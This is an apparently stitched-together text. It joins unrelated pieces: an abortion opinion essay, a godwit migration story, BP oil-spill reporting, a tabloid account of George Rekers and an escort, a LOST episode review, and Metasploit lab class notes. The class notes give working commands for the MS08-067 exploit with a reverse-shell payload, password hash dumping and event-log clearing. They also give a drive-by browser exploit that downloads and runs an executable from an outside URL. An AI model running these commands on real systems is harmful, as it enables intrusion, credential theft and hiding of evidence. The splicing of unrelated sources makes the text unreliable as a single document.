The idea that abortion has to be banned to protect women fails on two counts — both because of history , and because there ’s nothing feminist about suggesting that women are too stupid to handle basic rights .
Let ’s take these one at a time .
Sex .
Abortion .
Parenthood .

The notion that banning abortion can be expected to save women ’s health and well - being is simply and bluntly easy to disprove by looking at what actually happens when you ban abortion — desperate women seek dangerous abortions when safe ones are n’t available .
Not only is there a long American history of women ending up disabled or dead from botched self - abortions , but it ’s still going on all over the world .
Unlike the claims from anti-choicers that abortion causes breast cancer or depression , pro-choice evidence showing that illegal abortion drives women to unsafe abortion is absolutely true .
The notion that women are better off with serious infections , disablement , or death from safe abortion is so laughable that it ’s really not even up for debate .
But setting aside even these historical realities , the argument underpinning anti-choice “ feminism ” is one based on the very un-feminist belief that women are simply too stupid to know their own minds .
The narrative that suggests that women only think they want abortions , but will see the light if forced to bear children is to paint half of all adults as basically very tall children , except that it ’s legal to have sex with them .
In the anti-choice view , every single woman who enters an abortion clinic and asks for an abortion is really just a victim of her own stupidity and gullibility , and only after she has the abortion will she see how wrong she was .
( They need to believe this so badly they simply overlook the evidence showing that most women who have abortions feel relief , and even those who feel sadness often do n’t feel regret . )
Any feminism that starts with the premise that women are n’t equal to men , because women are too stupid to make their own decisions , is simply not a kind of feminism .
This is definitional — feminism starts with the belief that women are equal to men , especially with regards to intellectual and moral abilities .
A feminism that does n’t accept this is like a humanism that believes that human beings are fundamentally wicked and undeserving of rights — that is , it does n’t exist .
I can see how this can get confusing .
Conservatives put these “ women are fundamentally too stupid to make their own decisions ” argument in the mouths of women .
People expect that anti-feminists would generally distrust what women say , so when we ’re being asked to trust what anti-choice women say , it seems a little like it ’s not being anti-feminist .
Except that we ’re being asked to trust women only when they say women are too stupid to be trusted .
Never mind that saying , “ I ’m female , so trust me when I tell you that women are too stupid to be trusted , ” is a direct contradiction of itself , a meaningless statement .
If you find yourself getting a headache thinking about it , just remember that ’s the point .
Anti-feminist women making anti-feminist claims while pretending they ’re being feminist is about creating so much confusion about what feminism is that the public just gives up altogether .
But what it ’s definitely not about is advancing the interests or equality of actual women that are n’t wealthy female conservative politicians .
In 1976 , the biologist Robert E. Gill Jr. came to the southern coast of Alaska to survey the birds preparing for their migrations for the winter .
One species in particular , wading birds called bar - tailed godwits , puzzled him deeply .
They were too fat .
“ They looked like flying softballs , ” said Mr. Gill .
At the time , scientists knew that bar - tailed godwits spend their winters in places like New Zealand and Australia .
To get there , most researchers assumed , the birds took a series of flights down through Asia , stopping along the way to rest and eat .
After all , they were land birds , not sea birds that could dive for food in the ocean .
But in Alaska , Mr. Gill observed , the bar - tailed godwits were feasting on clams and worms as if they were not going to be able to eat for a very long time .
“ I wondered , why is that bird putting on that much fat ? ” he said .
Mr. Gill wondered if the bar - tailed godwit actually stayed in the air for a much longer time than scientists believed .
It was a difficult idea to test , because he could not actually follow the birds in flight .
For 30 years he managed as best he could , building a network of bird - watchers who looked for migrating godwits over the Pacific Ocean .
Finally , in 2006 , technology caught up with Mr. Gill ’s ideas .
He and his colleagues were able to implant satellite transmitters in bar - tailed godwits and track their flight .
The transmitters sent their location to Mr. Gill ’s computer , and he sometimes stayed up until 2 in the morning to see the latest signal appear on the Google Earth program running on his laptop .
Just as he had suspected , the bar - tailed godwits headed out over the open ocean and flew south through the Pacific .
They did not stop at islands along the way .
Instead , they traveled up to 7,100 miles in nine days — the longest nonstop flight ever recorded .
“ I was speechless , ” Mr. Gill said .

As I noted Tuesday , there is growing evidence that BP ’s oil well – technically called the “ well casing ” or “ well bore ” – has suffered damage beneath the level of the sea floor .
The evidence is growing stronger and stronger that there is substantial damage beneath the sea floor .
Indeed , it appears that BP officials themselves have admitted to such damage .
This has enormous impacts on both the amount of oil leaking into the Gulf , and the prospects for quickly stopping the leak this summer .
On May 31st , the Washington Post noted :
Sources at two companies involved with the well said that BP also discovered new damage inside the well below the seafloor and that , as a result , some of the drilling mud that was successfully forced into the well was going off to the side into rock formations .
“ We discovered things that were broken in the sub - surface , ” said a BP official who spoke on the condition of anonymity .
He said that mud was making it “ out to the side , into the formation . ”
On June 2nd , Bloomberg pointed out :
Plugging the well is another challenge even after BP successfully intersects it , Robert Bea , a University of California Berkeley engineering professor , said .
BP has said it believes the well bore to be damaged , which could hamper efforts to fill it with mud and set a concrete plug , Bea said .
Bea is an expert in offshore drilling and a high - level governmental adviser concerning disasters .
On the same day , the Wall Street Journal noted that there might be a leak in BP ’s well casing 1,000 feet beneath the sea floor :
BP PLC has concluded that its “ top - kill ” attempt last week to seal its broken well in the Gulf of Mexico may have failed due to a malfunctioning disk inside the well about 1,000 feet below the ocean floor .
***
The broken disk may have prevented the heavy drilling mud injected into the well last week from getting far enough down the well to overcome the pressure from the escaping oil and gas , people familiar with BP ’s findings said .
They said much of the drilling mud may also have escaped from the well into the rock formation outside the wellbore .
On June 7th , Senator Bill Nelson told MSNBC that he ’s investigating reports of oil seeping up from additional leak points on the seafloor :
Senator Bill Nelson ( D - FL ) : Andrea we ’re looking into something new right now , that there ’s reports of oil that ’s seeping up from the seabed … which would indicate , if that ’s true , that the well casing itself is actually pierced … underneath the seabed .
So , you know , the problems could be just enormous with what we ’re facing .
Andrea Mitchell , MSNBC : Now let me understand better what you ’re saying .
If that is true that it is coming up form that seabed , even the relief well wo n’t be the final solution to cap this thing .
That means that we ’ve got oil gushing up at disparate places along the ocean floor .
Sen . Nelson :
That is possible , unless you get the plug down low enough , below where the pipe would be breached .
Indeed , loss of integrity in the well itself may explain why BP is drilling its relief wells more than ten thousand feet beneath the leaking pipes on the seafloor ( and see this ) .
Yesterday , recently - retired Shell Oil President John Hofmeister said that the well casing below the sea floor may have been compromised :
[ Question ]
What are the chances that the well casing below the sea floor has been compromised , and that gas and oil are coming up the outside of the well casing , eroding the surrounding soft rock .
Could this lead to a catastrophic geological failure , unstoppable even by the relief wells ?
John Hofmeister :
This is what some people fear has occurred .
It is also why the “ top kill ” process was halted .
If the casing is compromised the well is that much more difficult to shut down , including the risk that the relief wells may not be enough .
If the relief wells do not result in stopping the flow , the next and drastic step is to implode the well on top of itself , which carries other risks as well .
As noted yesterday in The Engineer magazine , an official from Cameron International – the manufacturer of the blowout preventer for BP ’s leaking oil drilling operation – noted that one cause of the failure of the BOP could have been damage to the well bore :
Steel casing or casing hanger could have been ejected from the well and blocked the operation of the rams .
Oil industry expert Rob Cavner believes that the casing might be damaged beneath the sea floor , noting :
The real doomsday scenario here … is if that casing gives up , and it does come through the other strings of pipe .
Remember , it is concentric pipe that holds this well together .
If it comes into the formation , basically , you ‘ve got uncontrolled [ oil ] flow to the sea floor .
And that is the doomsday scenario .
Cavner also said BP must “ keep the well flowing to minimize oil and gas going out into the formation on the side ” :
And prominent oil industry insider Matt Simmons believes that the well casing may have been destroyed when the oil rig exploded .
Simmons was an energy adviser to President George W. Bush , is an adviser to the Oil Depletion Analysis Centre , and is a member of the National Petroleum Council and the Council on Foreign Relations .
On May 27th , Simmons addressed this issue on MSNBC : Visit msnbc.com for breaking news , world news , and news about the economy On May 26th , Simmons referred to this again on a second appearance on MSNBC :
And he referred to it again on Bloomberg on May 28th :
And again on MSNBC on June 7th :
We have a right to know what ’s really going on .
Given the impact on America ’s people , natural resources and economy , BP and the government must fully disclose the amount of damage underneath the sea floor , and what that means for the efforts to cap the well .

New evidence of criminal negligence in run-up to rig explosion
Failure of BP ’s “ top kill ” means oil will continue to flow for months
By Joe Kishore
31 May 2010
Forty days after the explosion at the BP - leased offshore drilling rig , oil continues to flow unabated from the bottom of the Gulf of Mexico .
After weeks of downplaying and covering up the extent of the disaster , government officials are now acknowledging that it is already the worst environmental catastrophe in the history of the United States … with no end in sight .
Over the weekend , BP reported its latest attempt to stop the flow — the so - called “ top kill ” method — had failed .
It announced plans for a new tactic , involving cutting off the leaking pipe and attempting to cap the oil .
The proposal is unlikely to succeed , and could result in a significant increase in the rate of the flow after the pipe is cut .
Even if it works , it will only contain a portion of the oil gusher .
“ The failure of the top kill magnifies the disaster by an order of magnitude , ” Rick Steiner , an oil spill expert and marine conservationist , told the World Socialist Web Site .
“ The blowout will continue unquestionably over the next two months . ”
BP is currently drilling separate wells designed to intersect with the existing well and plug the leak .
These wells will not be ready until at least August , BP officials said on Sunday .
The US Geological Survey ( USGS ) has estimated that the flow is between 500,000 and 1 million gallons per day .
At the higher range — which is still far smaller than the rate estimated by independent scientists — an additional 90 million gallons of oil will have been released by the end of August .
In comparison , the Exxon Valdez released 11 million gallons .
If these reserve wells fail , the spill will continue until the entire reservoir is depleted .
A BP spokesman said on Sunday that the company has no idea how much oil is in the reservoir .
With the collaboration of the Obama administration and the US Coast Guard , BP has sought to restrict media access to the worst affected regions , as oil has begun to wash ashore on the coast .
A CBS news team reported it was threatened with arrest by the Coast Guard as it attempted to reach an oiled beach .
The team was told the restrictions were according to “ BP ’s rules . ”
Other media have confirmed that access is being increasingly chocked off .
Nevertheless , the immense scale of the disaster is gradually coming out , with scientists discovering giant undersea plumes , in addition to the massive slick spreading across the surface of the Gulf .
Two plumes have already been discovered , but this is “ just the tip of the iceberg , ” said Steiner .
“ Some of the oil is probably down around the coast of Florida .
There may soon be tar balls on the south east coast of the state . ”
Making matters worse , the Atlantic hurricane season begins on Tuesday , and scientists anticipate that it will be a very active year .
A hurricane in the Gulf will surge oil deep into the wetlands and inland .
“ The first good hurricane will transfer this in the storm surge right into the bayous , ” Steiner said .
Hurricanes could also severely disrupt the drilling of the two additional wells being drilled by BP .
The Obama administration continues to cover for BP , even as new evidence has emerged documenting the criminal recklessness of the company in the run-up to the disaster .
Obama has gone from saying that he is “ angry and frustrated ” to declaring that the spill is “ enraging and heartbreaking . ”
However , the administration continues to avoid any talk of accountability , while suggesting that neither BP nor the government could have possibly foreseen the catastrophe .
Carol Browner , the White House energy advisor , was asked Sunday on NBC ’s Meet the Press why BP had no contingency plan for the disaster .
“ [ I ]t ’s important to understand that these wells have been drilled for several decades now , ” she replied .
“ There have not been these kinds of accidents . ”
Browner refused to rule out future deepwater oil drilling in the Gulf , saying , “ I want to see what the investigations tell us …. ”
BP and the administration ’s claims that an accident of this magnitude could not have been predicted is belied by an increasing mountain of evidence that BP deliberately ignored warning signs , with the help of the federal Minerals Management Service .
Citing internal BP documents , the New York Times reported on Sunday that engineers expressed concern as early as June 2009 about the well casing used in the Deepwater Horizon operation .
A report by a BP engineer that month warned that the casing could collapse under the high pressure at the depths BP was drilling .
“ This would certainly be a worst - case scenario , ” Mark E. Hafle , a senior drilling engineer at BP , wrote in the report .
“ However , I have seen it happen so know it can occur . ”
According to the Times , “ The company went ahead with the casing , but only after getting special permission from BP colleagues because it violated the company ’s safety policies and design standards .
The internal reports do not explain why the company allowed for an exception . ”
The Times goes on to report , “ In April of this year , BP engineers concluded that the casing was ‘ unlikely to be a successful cement job , ’ according to a document , referring to how the casing would be sealed to prevent gases from escaping up the well . ”
The document also concluded that the casing was unlikely to fulfill regulatory requirements from the MMS .
“ A second version of the same document says ‘ It is possible to obtain a successful cement job ’ and ‘ It is possible to fulfill M.M.S. regulations . ’”
According to BP , the 180 - degree shift in the evaluation was made after further testing .
In the weeks preceding the explosion on April 20 , there were many signs of problems , including sudden and repeated releases of gas from the well .
“ On at least three occasions , BP records indicate , the blowout preventer was leaking fluid , which the manufacturer of the device has said limits its ability to operate properly , ” the Times reported .
Loss of well control led to a halt of operations , but no assessment was made as to whether or not the drilling should continue .
“ After informing regulators of their struggles , company officials asked for permission to delay their federally mandated test of the blowout preventer , which is supposed to occur every two weeks , until the problems were resolved , BP documents say . ”
After first denying this request , the MMS reversed itself .
According to the Times , “ When the blowout preventer was eventually tested again , it was tested at a lower pressure — 6,500 pounds per square inch — than the 10,000 - pounds - per - square - inch tests used on the device before the delay .
It tested at this lower pressure until the explosion . ”
In other words , both BP and government officials were aware the well was causing major problems that could lead to a blowout , and that the blowout preventer itself was experiencing problems .
Yet BP , with the agreement of the government agency , decided to rig the tests and ignore the warnings of a potential disaster so it could continue drilling .
Let us know how you used reverse cell phone search and we 'll post it !
The male escort hired by anti-gay activist George Alan Rekers has told Miami New Times the Baptist minister is a homosexual who paid him to provide body rubs once a day in the nude , during their ten - day vacation in Europe .
Rekers allegedly named his favorite maneuver the " long stroke " -- a complicated caress " across his penis , thigh ... and his anus over the butt cheeks , " as the escort puts it .
" Rekers liked to be rubbed down there , " he says .
In his first interview since New Times broke the story Tuesday , the 20 - year - old escort , who prefers to go by the name Lucien , contradicts Rekers 's contentions that he hired the escort to help carry his luggage and that he was trying to save the soul of a lost sinner .
Although Rekers does have physical ailments that make it difficult for him to haul suitcases , Lucien was n't hired to carry luggage on their European vacation , the escort says .
" It 's a situation where he 's going against homosexuality when he is a homosexual , " Lucien says .
( When New Times called seeking comment , Rekers had turned his phone off .
An email was not returned .
He has termed the New Times article " slanderous " on his website . )
Lucien was interviewed late last night in the Fort Lauderdale house where he was laying low for the evening .
The townhome he rents in a west Miami suburb has been inundated by uninvited guests since Unzipped revealed Lucien 's identity first ( link NSFW ) .
Rekers 's trip with Lucien has grabbed worldwide headlines and been the subject of monologues by Steven Colbert and Jay Leno .
Lucien decided to speak out after a heart - to - heart with a friend , Michael , who alerted him to the grim realities of his client 's anti-gay activities .
Lucien , who had originally declined to speak about the trip , now says he can do little good by protecting his erstwhile , fundamentalist client .
In the past 24 hours , Rekers , a board member at the National Association for Research & Therapy of Homosexuality ( NARTH ) and cofounder of the Family Research Council , has claimed he took Lucien to Europe to inspire him to accept Jesus into his heart and renounce his homosexuality .
Lucien now offers Rekers a counterproposal : " In all honesty , he should disassociate himself from these [ anti - gay ] groups . "
New Times spent more than three hours with Lucien in the wee hours of Thursday morning .
Check back this afternoon for stories detailing the trip , the document Rekers asked Lucien to prepare in the hopes of preventing any future disclosures , and a character sketch of what we think is a brave kid -- one who dawdled for less than 24 hours before opting to tell an exceptionally painful story .

What follows are the class notes for Adrian 's section :
Metasploit Intro : Class Notes
This sheet is meant to be a convenient set of notes for the exercises Adrian will be demonstrating in class .
These are the commands used in the demos for your reference , along with why they were used .
Items in blue are things you type , green are things you click , gray is something optional that you may want to play with latter and red is just to grab your attention .
--------------------------------------------------------
Exercise 0 : Getting into BackTrack 4
--------------------------------------------------------
Login with " root " as the user name and " toor " as the password .
So we can more easily get around , we will also start up X windows : startx
Then , since the network starts off as disabled ( a good idea so as not to announce yourself on the network till you are ready ) let 's bring it up and note our IP : /etc/init.d/ networking start ifconfig
--------------------------------------------------------
Exercise 0.5 : Login to XP
--------------------------------------------------------
Log in with " IndySploit " as the user name and " password " as the password .
Then note our IP ( Students will not need to do this step unless they brought their own XP VM ) : ipconfig
--------------------------------------------------------
Exercise 1 : A few simple commands for Metasploit in BT4
--------------------------------------------------------
I plan to point these commands out , but not run them to completion .
Grab the latest Metasploit Modules : msfupdate
If you want to script some stuff later , look into : msfcli | less
There is also the GUI , but we will not be using it in class : msfgui
--------------------------------------------------------
Exercise 2 : Let's Demo Metasploit MSFWeb interface in BT4
--------------------------------------------------------
To start off easy let�s use the web interface .
It is not as well supported as msfconsole , but it�s prettier to show management the easy of exploitation ( the ampersand is there so we can keep typing commands at the shell ) : msfweb &
Now let 's start FireFox and go to : http://127.0.0.1:55555
You will most likely have to disable NoScript to het the web interface to work correctly .
Now that we have the web interface up , let 's look for a module to use .
Click " Exploit " , and on the search bar enter : psexec
On the list that comes up , choose " Microsoft Windows Authenticated User Code Execution " , " Automatic " and for payload choose " windows/vncinject/reverse_tcp "
For the RHOST enter the IP of the XP box .
SMB Password and SMB User are " password " and " IndySploit " respectively .
For LHOST enter the BT4 box 's IP .
Not clicking the " Launch Exploit " button should be all we need to do to get a lovely VNC session .
--------------------------------------------------------
Exercise 3 : Let 's use MSFConsole under BT4
--------------------------------------------------------
Fire up the MSFConsole : msfconsole
Now note that you can type normal * nix commands for inside of MSFConsole : ifconfig
When in doubt , scream and shout : help
Also note , tab completion works .
Now in MSFWeb we did not use a real vulnerability ( psexec really is a feature ) , so let�s try an exploit this time .
First let�s find an exploit : search netapi
Ok , we found one I want to use , let 's find out more about it : info windows / smb/ms08_067_netapi
Sounds good , let 's use it : use exploit / windows / smb/ms08_067_netapi
Now we need to set some options .
We can use " set " to just set them this one time , or use " setg " so they stick around if we switch to another module .
Use " back " , " unset " or " unsetg " if you screw up and have a typo .
Let select a payload to use : setg payload windows / meterpreter / reverse_tcp
We could also set an encoder to use , but this is optional : set encoder x86/shikata_ga_nai
Ok , what options do we need to set ?
show options
Anything else cool we can do to customize the pwnage ?
show advanced
Ok , let�s set some required options that don�t already have defaults , fill in the items in brackets accordingly : setg rhost < XP box 's IP >
setg lhost < BT4 box's IP >
Now let�s tell Metasploit to fire off the exploit , and see if things work : exploit
If that worked , we should have a Meterpreter session .
Martin will talk more on Meterpreter later , but here are a few Commands to try :
< We are now in Meterpreter >
Get some help : help
Let�s get some info about the system : sysinfo
Get a command prompt on the exploited box : shell
exit Get back to the MSFConsole prompt : background
< We are now out of Meterpreter >
Ok , what sessions are there ?
help sessions
sessions
Ok , let 's get back into our Meterpreter session : sessions - i 1 < We are now in Meterpreter >
We will try to run a command on the remote box , and see it in the process list : execute -f notepad.exe
ps
Grab some hashes : hashdump Clear the event log : clearev
Run a Meterpreter script : run scraper
A bunch of nifty stuff should now be in /root /.msf3/logs /scraper/
If you have updated to the latest version , this is a also a fun command : screenshot
--------------------------------------------------------
Exercise 4 : Extra credit , start a server on your box and do a drive by browser exploit
--------------------------------------------------------
( You will need to have an Internet connection , used msfupdate to get the latest modules , and have a webcam hooked up to the exploited box .
Or you could just modify these commands to work for your circumstances . )
Under BT4 VM : msfconsole
use exploit / windows / browser/ms10_002_aurora
set uripath pwnme
set payload windows / download_exec
set url http://irongeek.com/temp/camserver.exe
exploit
On the XP box , web surf to : http://<ip of BT4 box >:8080 / pwnme Under BT4 , web surf to : http://<ip of XP box >

I hate that I have to fight with the logical side of myself when watching a movie .
You know , Potts could 've just tossed him a gun , or shot him herself .
Shuddup .
I like how the bad guy did n't take the opportunity to slice him with the whips during that long transformation .
I said shuddup !
Why did n't he just blow him back with the hand - mounted repulsors like he did to the guys in Gulmira in the first movie ?
OK you gotta get the fuck outta here .

LOST Season Six . Episode 16 .
What They Died For .
All Together Now
The Siblings Shephard
The Great Escape
Teachers Lounge
Bedside Manor
The Drama Initiative
The Once and Future King
The Next Stage
I needed that .
After last week ’s polarizing , ambiguous mythology exploration , I needed an episode that perfectly reset our characters ’ situations and advanced the plot .
In my opinion , “ What They Died For , ” delivered , equaling the accomplishments of other near - the - end - of - the - season episodes such as “ ? ” , “ Man Behind the Curtain , ” “ Greatest Hits , ” and “ The Variable . ”
No character was left untouched – from the all - encompassing alternate storyline to the Island - hopping reveals and murders .
Multiple moving parts complemented each other instead of distracting from each other .
Next to “ Sundown , ” this was my favorite offering of Season Six .
It was everything I hoped Across the Sea was going to be , and it made me appreciate that episode a lot more .
Desmond resumed his role as puppet master in the alternate universe last night .
Plain and simple .
The dude was working all the angles , “ orchestrating ” the reunion necessary to his mission .
Watching it , we were – at times – as much in the dark and unaware of Desmond ’s intervention as the characters themselves .
But that only made the revelation that he was in complete control all the more credible .
Papa Jack , son David and Auntie Claire .
All living in perfect harmony .
Sitting down to a breakfast of Super Bran only to WAIT A MINUTE .
“ Super Bran . ”
That ’s got to be an anagram , right ?
S - U - P-E-R B - R - A - N becomes … ” Spear Burn ! ” Yes , Spear Burn !
It has to mean something right ?!
Right ?
Hello … Okay fine .
They ’re just bran flakes .
Good to see the Shephards staying regular .
And good to get the nugget that little David is set to perform at a concert that evening , where Jack , Claire and David ’s mom will be in attendance .
I was hoping we ’d learn who David ’s mom was last night , but in light of the awesomeness of the episode as a whole , I ’ll let it slide .
But it ’s probably Nikki .
The important thing : those three are heading to the concert , and they ’re not the only ones .
But what was with Desmond calling Jack , pretending to be an Oceanic Airlines employee and claiming that they had found his dad ’s coffin ?
If Jack ’s headed to the concert anyway , what does Desmond need to pull that string for ?
I do n’t know , but do n’t forget about it .
I get the feeling that Jack ’s mission is n’t going to be as simple as showing up to hear David tickle the ivories .
Desmond further manipulated the mainland with his brilliant prison break of Kate and Sayid .
I loved this .
There ’s not much to analyze here , it was just a sweet move by my hetero - man - crush Desmond .
The old pose - as - the - prisoner gag , complete with a Hugo Reyes bailout , a payoff of Officer Ana Lucia Cortez ( who “ is n’t ready yet ” for spiritual alternate reality awakening ) and a dress that I ’m pretty sure Kate will look phenomenal in .
Because Kate is hot .
Most importantly : they , too , are on their way to the concert .
Working the longest substitution gig ever , Locke goes back to school to resume work .
But waiting in the parking lot is his assailant , Desmond Hume .
Before Desmond can put the pedal to the mettle ( pun alert ! ) , he ’s intercepted by Mr. – excuse me , Doctor – Linus .
Desmond proceeds to beat the hell out of Ben , the same way he did when Ben visited and shot him at his houseboat during the Oceanic Six ordeal .
In fact , so keen was the parallel between those two scenes that a few blows to the head woke Ben Linus up , and he saw glimpses of that life in the same way that Hurley , Charlie and Desmond had before him .
Of more importance was Desmond ’s explanation of his attempted Locke- acide .
He told Ben he was trying to help John “ let go , ” and when Ben communicated that to John , it resonated soundly .
If the parking lot rundown and the hospital run-in did n’t awaken John Locke to the existence of his alternate self , this short conversation with Ben did .
Side note : Good to see Rousseau and Alex again .
I have nothing to say about that .
It was a nice aside , and good to see the kind of parent Danielle Rousseau could be , given the chance to be one in more normal circumstances .
That is all .
Freshly awoken , Locke decided to pay a third visit to Dr. Shephard .
Here we saw that Mr. Locke was n’t just awoken to the possibility of his alternate self , but also to the the reincarnation of his Island - born faith .
The scene was laden with heavy remixes of some of LOST ’s most storied dialogue .
“ But what if all this – maybe this is happening for a reason , ” John Locke said of his chance encounters with Jack and other Oceanic 815 passengers – echoing his sentiments about his chance crash landing with Jack and the original Oceanic 815 passengers .
“ I think you ’re mistaking coincidence for fate , ” Jack said about Locke ’s newfound faith , spinning Mr. Eko ’s Season
Two warning about the importance of the hatch .
It was glorious , really , the way this episode came full circle to an alternate reality conversation in which whatever was said , was said .
Just like certain events cannot be avoided by messing with time and space , apparently certain truths are meant to be delivered to our characters by very particular , precise , pointed dialogue .
And that conversation with Jack and Locke last night was the universe ’s way of course correcting their conflict , setting them back up as strong personalities on ambiguous and ever - changing sides of the debate over faith versus reason .
In another plotline that seems to complicate Jack ’s alternate reality mission , Locke agrees to do the surgery .
Again I wonder , if they ’re all headed to The Desmond Hume Philharmonic Orchestra , then what ’s important about Locke agreeing to do surgery or Jack thinking his father ’s coffin has turned up at LAX ?
Questions for Sunday night , I suppose … We finally caught back up with Ben , Miles and Richard last night , as the unholy triumvirate made their way back to Dharmaville to procure some C4 , in order to blow up the plane .
Spoiler alert , fellas , Widmore beat you to both the plane and the Dharma cabin .
I really liked Ben ’s quick aside that he was going to the place “ where I was told I could summon the monster .
That ’s before I realized , it was the one summoning me . ”
I ’ve been harboring this feeling that Ben – whether he knew it or not – was following Smokey all those years , instead of his beloved Jacob .
This line seemed to confirm that .
And perhaps it speaks to the perils of unwavering , unquestioning faith .
For five seasons , we watched Ben blindly execute the will of what he believed to be Jacob .
All it got him was a massive purge of the Dharma Initiative , the death of his own daughter and the demise of the Island ’s inhabitants .
Last night ,
Ben seemed to acknowledge the fallacy of his loyalty , and its very real consequences .
That acknowledgement was reaffirmed when the trio traversed some hallowed ground , where Miles ’ sixth sense needle went off the page .
Turns out , they were walking over the spot where Richard had done Ben the favor of burying Alex .
Maybe he did it so Smokey could n’t assume her corpse and use it to manipulate Ben .
But we all saw how that turned out last season in The Temple , when Alex ’s ghost persuaded Ben to follow Flocke into the dark .
This moment and the acknowledgement of Smokey ’s power before it would prove to be Ben ’s motivations for the remainder of his episode .
He laid out what might be last bargaining chips and asked Smokey to call .
But Smokey raised .
Widmore – squatting with Zoe in Ben ’s old home – intriguingly alluded to an off - Island encounter with Jacob , who he claimed showed him the error of his ways and put him on his current path .
If Ben was looking for one final reason to let go of his faith in Jacob , he got it when his arch - nemesis claimed to be acting on Jacob ’s orders .
If there ’s one thing Ben knows at this point , it ’s that whatever side Charles Widmore is on , he ’s on the opposite .
So if Widmore is acting on Jacob ’s directive , then Jacob ’s nemesis is right .
The enemy of my enemy is my friend .
And who should come rowing ashore to expedite the conflict ?
Flocke !
Widmore and Zoe hide to protect themselves and their Jacobian motives , embedding themselves deep in the home of Jacob ’s former acolyte to draw a physical parallel to their usurping of Ben ’s position as Jacob ’s right hand man .
But Ben does n’t care .
He and Richard are off to the front yard to confront Flocke once and for all .
I thought Richard ’s death – considering it took hundreds of years to accomplish – was rather unceremonious .
But hey , if Frank Lapidus does n’t get an epic death , then neither do you , eyeliner boy !
Besides , Flocke could n’t be bothered to draw out Richard Alpert ’s death .
He had an apprentice to mold .
Ben , waiting like a dog on the front porch for his master , agrees to a deal with Flocke : he ’ll help him leave the Island by killing some people in exchange for carte blanche Island dominance .
Ben served Flocke much in the way that Sayid served Ben , as an emotionless empty vessel assassin .
The first name on his list was Charles Widmore ( well technically Zoe was first , but as Flocke said , she was “ pointless ” ) .
Flocke and Widmore engage in a tete a tete , with Flocke threatening to kill Penny before giving Widmore a chance to explain his mission .
Before Charles can get into specifics ,
Ben draws on the recently remembered painful memory of what Charles ’ men did to his daughter , and then pumps Widmore ’s chest full of lead from the entry of his once - sacred secret room .
“ He does n’t get to save his daughter , ” Ben said mercilessly .
I loved it .
Ben ’s aimless search for purpose has been the driving force of his character , so his directionless mood in Season Six has seemed unfulfilling .
But now , he has a purpose again .
And even though that purpose serves bad intentions , it ’s a purpose nonetheless .
For Ben , an evil purpose is better than no purpose at all .
We first learned that when he purged the Dharma Initiative .
And we had it confirmed last night , as he turned to Flocke and said coldly , “ Did you say there were some other people to kill ?
” Finally , Ben and Flocke venture to the well , where they see that Desmond has been freed .
It might not be important , but I do n’t think Sayid freed him .
Sayid seemed to be telling the truth when he told Jack , two weeks ago , that Desmond was in that well .
So who freed him ?
You guessed it , Vincent the dog .
Okay , I do n’t know who got him out of that well .
Perhaps Sting dug him out .
If you get that reference , we should hang .
Regardless , I loved the measured reintroductions of Ben and Miles and the resolutions of Richard , Zoe and Charles Widmore .
It was the tying up of loose ends , but it was done purposefully , with Ben being redeemed with a new sinister purpose and Richard and Charles being murdered once their usefulness had run out .
Put another way , the Island was done with Richard and Charles .
It ’s not done with Ben Linus quite yet .
The four castaways who found themselves on Jacob ’s list at the end of Season Two ( Hey !
Remember when Michael had that list ?
Turns out the Others kind of knew what they were doing ! ) continued to mourn the death of their friends on the beach .
But Jack was n’t going to let them wallow in it for long .
To quote his father , they had “ work to do . ”
In Jack ’s view , that meant it was time to exact revenge on Flocke for killing his friends .
Quickly though , I liked how Jack was sewing up Kate ’s wound on the beach .
It was a nice skewed mirror version of the Pilot episode , in which Kate stitched up Jack in the jungle .
I also liked how Jack made the very Jacobian move of using fresh pain to motivate action .
Sawyer , Kate and Hurley followed Jack like it was Season
One all over again , as he tactfully utilized the deaths of Jin , Sun and Sayid to move them toward a greater purpose .
It was a nice foreshadowing of Jack ’s later transformation into the new Jacob .
The most important breakthrough of the night , in this story arc , was that Jacob could be seen and heard by Jack , Kate and Sawyer .
Hurley , for one , seemed happy to be relieved of his role as interpreter .
Likewise , we as the audience had to feel some sense of relief that the communications barriers were coming down , and answers were about to be given .
As Jacob said , “ We ’re very close to the end , Hugo . ”
And because Hurley acts as the audience ’s surrogate , we could safely ( and correctly ) assume that Jacob was reassuring the audience that resolution was within reach .
Jacob unloaded answers on four castaways who were all ears , promising to explain to them what their friends had died for and why they had all been chosen .
But Jacob was interested in more than debriefing his candidates .
“ Then I ’ll tell you everything you need to know about protecting this Island , because by the time that fire burns out , one of you is going to have to start doing it , ” he said , inviting them into the gnarliest group job interview ever .
Jacob explains that he made a mistake when he threw his brother into the light , and that the error of creating Smokey was the impetus for his recruitment of our castaways .
He knew immediately that his brother would seek revenge on him for separating him from his corporeal self ( a fate “ worse than death ” as we learned last week ) , and he needed the candidates in place to take over in case his brother ever succeeded .
Why them , though ?
“ None of you were ( ‘ doing just fine ’ ) .
I did n’t pluck any of you out of a happy existence .
You were all flawed .
I chose you because you were like me , you were all alone .
You were all looking for something that you could n’t find out there .
I chose you because you needed this place as much as it needed you . ”
If ever a single line of dialogue has synthesized more in this series , I have n’t heard it .
That line from Jacob was perfect .
It was addressed as much to us as it was to Jack and his friends .
And it reaffirmed the notion of the Island as a kind of Purgatory without making that direct biblical parallel .
Jacob sought souls in need of saving , but with potential for triumph .
He looked for those whose loneliness led to a quest for purpose , which would explain why John Locke ’s soul was always considered particularly special .
Hell , he even threw us a bone and explained that Kate was only crossed out because she was a mother , but that the job was hers for the taking .
Thanks Jacob !
Jacob ultimately sells the job by giving the candidates the one thing he never had : choice .
Here , we might ’ve just gotten the best explanation of Jacob ’s modus operandi that we ’ll get .
The reason he believed so strongly in man ’s ability to choose was because he wanted to give them what he was never granted .
He believes that man is capable and worthy and deserving of free will , and that given it , they can achieve anything – including protecting The Island and all mankind from the forces of evil .
That ’s an optimist for you .
So how do you do this job that Jacob has described ?
Why you just have to kill a walking corpse who ’s impervious to bullets and cannot be killed once he ’s spoken to you and has been plotting this fight for thousands (? ) of years while carefully manipulating all the variables in his favor .
And he also just recruited the Island ’s preeminent carpetbagger wunderkind to help him out .
It ’s a tall order , but Jack Ignatius Shephard is up to the task .
Okay , I made up Ignatius .
But in a move that surprised nobody , the “ god complex ” - afflicted good doctor finally got the patient he ’d been waiting for his entire life : the human race .
Jack drew on a combination of his newfound faith and his long - held pragmatism , reasoning that he was best - suited to protect the Island while simultaneously avowing that , “ This is why I ’m here , this is what I ’m supposed to do . ”
It was a long overdue marriage of faith and science in my opinion .
Scientifically , logically , Jack was the best choice to take over the Island .
His natural - born protection instinct is a perfect asset .
